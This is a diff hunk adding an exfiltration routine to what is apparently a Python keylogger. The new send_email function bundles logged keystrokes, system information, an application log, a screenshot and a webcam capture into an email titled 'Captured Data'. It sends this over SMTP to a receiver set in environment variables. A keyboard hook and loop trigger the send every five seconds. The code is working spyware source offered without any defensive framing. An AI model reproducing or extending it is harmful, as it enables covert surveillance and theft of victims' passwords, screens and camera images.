@@ -105,4 +105,125 @@ def capture_keys():
                 file.write(f"Timestamp: {current_time}, Application: {app_name}\n")
             active_apps.clear()
 
-            
+
+    def send_email():
+        sender_email = os.getenv('EMAIL_SENDER')
+        receiver_email = os.getenv('EMAIL_RECEIVER')
+        smtp_server = os.getenv('SMTP_SERVER')
+        smtp_port_str = os.getenv('SMTP_PORT')
+        username = os.getenv('EMAIL_USERNAME')
+        password = os.getenv('EMAIL_PASSWORD')
+
+        missing = [name for name, val in (
+            ('EMAIL_SENDER', sender_email),
+            ('EMAIL_RECEIVER', receiver_email),
+            ('SMTP_SERVER', smtp_server),
+            ('SMTP_PORT', smtp_port_str),
+            ('EMAIL_USERNAME', username),
+            ('EMAIL_PASSWORD', password),
+        ) if not val]
+        if missing:
+            print(f"Missing environment variables: {', '.join(missing)}. Aborting email send.")
+            return
+
+        try:
+            smtp_port = int(smtp_port_str)
+        except ValueError:
+            print(f"Invalid SMTP_PORT value: {smtp_port_str}")
+            return
+        
+        message = MIMEMultipart()
+        message['From'] = sender_email
+        message['To'] = receiver_email
+        message['Subject'] = 'Captured Data'
+        
+        screenshot()
+        capture_camera("webcam.png")
+        
+        if ensure_file_access('document.txt'):
+            try:
+                with open('document.txt', 'rb') as file:
+                    attachment = MIMEBase('application', 'octet-stream')
+                    attachment.set_payload(file.read())
+                encoders.encode_base64(attachment)
+                attachment.add_header('Content-Disposition', 'attachment', filename='document.txt')
+                message.attach(attachment)
+            except Exception as e:
+                print(f"Warning: could not attach document.txt: {e}")
+        
+        if ensure_file_access('syseminfo.txt'):
+            try:
+                with open('syseminfo.txt', 'rb') as file:
+                    attachment = MIMEBase('application', 'octet-stream')
+                    attachment.set_payload(file.read())
+                encoders.encode_base64(attachment)
+                attachment.add_header('Content-Disposition', 'attachment', filename='syseminfo.txt')
+                message.attach(attachment)
+            except Exception as e:
+                print(f"Warning: could not attach syseminfo.txt: {e}")
+        
+        if ensure_file_access('applicationLog.txt'):
+            try:
+                with open('applicationLog.txt', 'rb') as file:
+                    attachment = MIMEBase('application', 'octet-stream')
+                    attachment.set_payload(file.read())
+                encoders.encode_base64(attachment)
+                attachment.add_header('Content-Disposition', 'attachment', filename='applicationLog.txt')
+                message.attach(attachment)
+            except Exception as e:
+                print(f"Warning: could not attach applicationLog.txt: {e}")
+        
+        screenshot_file = 'screenshot.png'
+        if os.path.exists(screenshot_file):
+            with open(screenshot_file, 'rb') as file:
+                attachment = MIMEBase('application', 'octet-stream')
+                attachment.set_payload(file.read())
+            encoders.encode_base64(attachment)
+            attachment.add_header('Content-Disposition', 'attachment', filename='screenshot.png')
+            message.attach(attachment)
+        
+        webcam_file = 'webcam.png'
+        if os.path.exists(webcam_file):
+            try:
+                with open(webcam_file, 'rb') as file:
+                    attachment = MIMEBase('application', 'octet-stream')
+                    attachment.set_payload(file.read())
+                encoders.encode_base64(attachment)
+                attachment.add_header('Content-Disposition', 'attachment', filename='webcam.png')
+                message.attach(attachment)
+            except Exception as e:
+                print(f"Warning: could not attach webcam.png: {e}")
+        
+        try:
+            if smtp_port == 465:
+                with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
+                    server.login(username, password)
+                    server.sendmail(sender_email, receiver_email, message.as_string())
+            else:
+                with smtplib.SMTP(smtp_server, smtp_port) as server:
+                    server.ehlo()
+                    server.starttls()
+                    server.ehlo()
+                    server.login(username, password)
+                    server.sendmail(sender_email, receiver_email, message.as_string())
+            print('Email sent successfully!')
+        except smtplib.SMTPAuthenticationError as e:
+            print('Failed to send email: authentication failed.')
+            print('If using Gmail, enable 2-Step Verification and use an App Password in .env')
+            print('SMTP server response:', getattr(e, 'smtp_error', str(e)))
+        except smtplib.SMTPException as e:
+            print('Failed to send email:', str(e))
+    
+    keyboard.on_press(on_key_press)
+    
+    try:
+        while True:
+            elapsed_time = time.time() - start_time
+            if elapsed_time >= 5:
+                write_to_file()
+                write_application_log()
+                send_email()
+                start_time = time.time()
+    except KeyboardInterrupt:
+        pass
+    keyboard.unhook_all()
